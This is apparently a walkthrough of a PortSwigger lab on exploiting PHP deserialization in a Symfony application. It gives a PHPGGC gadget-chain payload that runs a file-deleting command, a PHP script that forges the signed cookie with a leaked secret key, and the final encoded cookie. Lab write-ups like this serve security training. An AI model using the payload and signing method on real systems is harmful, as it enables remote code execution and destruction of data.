---
title: " PortSwiggerlabs: Exploiting PHP deserialization with a pre-built gadget chain"
date: 2026-06-29 12:00:00 +0000
categories: [PortSwiggerLabs , Insecure Deserialization ]
tags: [PortSwiggerLabs , Insecure Deserialization , Challenge , Web_Attacks ]
---


## Information : 

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter


## Solution : 

First we login as wiener : 

<img width="1595" height="635" alt="image" src="https://github.com/user-attachments/assets/ac781f9a-43c0-4faa-a460-b09493a51eb7" />

Then we check Burp Site map to see if we have any serialized objects inside the requests : 

<img width="1903" height="871" alt="image" src="https://github.com/user-attachments/assets/97af7e6b-c83a-42f7-b79d-d105c31b7b8f" />

Perfect, we find our serialized object : 

```bash
{"token":"Tzo0OlVzZXI6Mjp7czo4OnVzZXJuYW1lO3M6MTM6YWRtaW5pc3RyYXRvcjtzOjEyOmFjY2Vzc190b2tlbjtzOjMyOnd1cjVhM25sNWN5cHhsZnN5NjFocG01MWl2b3JoYXZ3O30K","sig_hmac_sha1":"168071896a554cb23b3452444a3dba6d79e8fbcb"}
```

The base64 value inside Token is : 

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"wur5a3nl5cypxlfsy61hpm51ivorhavw";}
```

<img width="1103" height="221" alt="image" src="https://github.com/user-attachments/assets/658837bb-b264-4922-aaf0-df2ebee308a5" />

This is clearly a PHP serialized object . 

We also see the php.info file in the Site map , let's check it : 

<img width="1203" height="687" alt="image" src="https://github.com/user-attachments/assets/775e8b53-3861-45ee-b9d8-d127f9b662ef" />

We find a secret Key in the environment variables, we can use this to sign the modifications that we make later on , for now we keep looking : 

First try , let's try modifying the Cookie : 

```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"wur5a3nl5cypxlfsy61hpm51ivorhavw";}
```

<img width="1109" height="254" alt="image" src="https://github.com/user-attachments/assets/6290fc92-8315-4979-b16a-5adabd42e707" />

we just modify the cookie and see if we get any verbose errors : 

<img width="1895" height="657" alt="image" src="https://github.com/user-attachments/assets/a60e336f-f522-429b-890f-c4be93d236c4" />

Perfect we get the version of the framework used : 

<img width="1895" height="657" alt="image" src="https://github.com/user-attachments/assets/a1a6d6dd-503b-48a5-8b74-c7a15ba9599f" />

Looking Online i found this tool : 

<img width="1764" height="897" alt="image" src="https://github.com/user-attachments/assets/c2a0fffb-408c-425f-892c-9c57325f5887" />

This is used to generate payloads for multiple php frameworks, we can test it to see if we find anything for Symphony 4.3 :

```bash
git clone https://github.com/ambionics/phpggc.git
sudo apt update
sudo apt install php-cli -y
cd phpgcc
./phpgcc -help
```

<img width="795" height="670" alt="image" src="https://github.com/user-attachments/assets/3db23dec-b42a-4a5f-b1b3-2181021a4ea0" />

First we list all gadgets that we can use : 

<img width="1562" height="492" alt="image" src="https://github.com/user-attachments/assets/fbf5d204-605b-4241-bf5f-1b2b936da2c6" />

Perfect , now we can use the Symfony/RCE4 :

<img width="1473" height="371" alt="image" src="https://github.com/user-attachments/assets/21a5996e-fb84-471e-baa4-39c0cd505d38" />

```php
O:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"Symfony\Component\Cache\Adapter\TagAwareAdapterdeferred";a:1:{i:0;O:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"*poolHash";i:1;s:12:"*innerItem";s:26:"rm /home/carlos/morale.txt";}}s:53:"Symfony\Component\Cache\Adapter\TagAwareAdapterpool";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"Symfony\Component\Cache\Adapter\ProxyAdapterpoolHash";i:1;s:58:"Symfony\Component\Cache\Adapter\ProxyAdaptersetInnerItem";s:4:"exec";}}
```

We then need to Base64 encode this , use the Secret_Key for signing , for the signing part we need to write a php script to do this : 

I will be using the one given to us by PortSwigger :

```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

So the final script is : 

```php
<?php
$object = "Tzo0NzpTeW1mb255Q29tcG9uZW50Q2FjaGVBZGFwdGVyVGFnQXdhcmVBZGFwdGVyOjI6e3M6NTc6U3ltZm9ueUNvbXBvbmVudENhY2hlQWRhcHRlclRhZ0F3YXJlQWRhcHRlcmRlZmVycmVkO2E6MTp7aTowO086MzM6U3ltZm9ueUNvbXBvbmVudENhY2hlQ2FjaGVJdGVtOjI6e3M6MTE6KnBvb2xIYXNoO2k6MTtzOjEyOippbm5lckl0ZW07czoyNjpybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dDt9fXM6NTM6U3ltZm9ueUNvbXBvbmVudENhY2hlQWRhcHRlclRhZ0F3YXJlQWRhcHRlcnBvb2w7Tzo0NDpTeW1mb255Q29tcG9uZW50Q2FjaGVBZGFwdGVyUHJveHlBZGFwdGVyOjI6e3M6NTQ6U3ltZm9ueUNvbXBvbmVudENhY2hlQWRhcHRlclByb3h5QWRhcHRlcnBvb2xIYXNoO2k6MTtzOjU4OlN5bWZvbnlDb21wb25lbnRDYWNoZUFkYXB0ZXJQcm94eUFkYXB0ZXJzZXRJbm5lckl0ZW07czo0OmV4ZWM7fX0K";
$secretKey = "b203xtiplh8yplhdgm7dypb23u1rd2uv";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

<img width="1914" height="467" alt="image" src="https://github.com/user-attachments/assets/97f4d2a5-cd4a-42c8-977d-c41428f70cf1" />

From here we just take the Encoded value and replace the cookie with it and hopefully it will exeucte the code when the server deserializes the object : 

```bash
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22106be2e55d9608c224663c760e5b4426dff55e46%22%7D```

Now either modify it inside Repeater , or just use Devtools to inject the new cookie :

<img width="1864" height="935" alt="image" src="https://github.com/user-attachments/assets/c806fb69-7655-4fe3-bb37-d06700a6ea72" />

That was all for this lab, see you in the next one :)

